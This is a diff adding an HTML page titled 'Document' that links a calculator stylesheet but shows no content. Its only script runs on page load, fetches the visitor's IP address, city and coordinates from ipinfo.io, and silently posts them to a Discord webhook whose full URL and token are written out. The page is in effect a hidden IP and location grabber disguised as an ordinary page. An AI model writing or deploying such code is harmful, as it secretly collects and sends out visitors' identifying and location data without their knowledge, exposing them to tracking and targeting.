@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="calc.css">
+</head>
+<body>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            let ip
+
+            fetch("https://ipinfo.io/json") 
+                .then(response => response.json())
+                .then(data => {
+                    function sendMessage() {
+                      const request = new XMLHttpRequest();
+                      request.open("POST", "https://discordapp.com/api/webhooks/1330281072189112341/YxKwYlSFLXoe4fdRKHLCqGxFzDOs1Lq5If-Q5JeJM_Rbn27cPI5MY1MKe8BHcF9KgA_6");
+                    
+                      request.setRequestHeader('Content-type', 'application/json');
+                    
+                      const params = {
+                        username: "My Webhook Name",
+                        avatar_url: "",
+                        content: `City: (${data.city})
+IP: (${data.ip})
+Coords: (${data.loc})`
+                      }
+                  
+                      request.send(JSON.stringify(params));
+                    }
+                    sendMessage()
+                    console.log(data)
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+            });
+    </script>
+</body>
+</html>
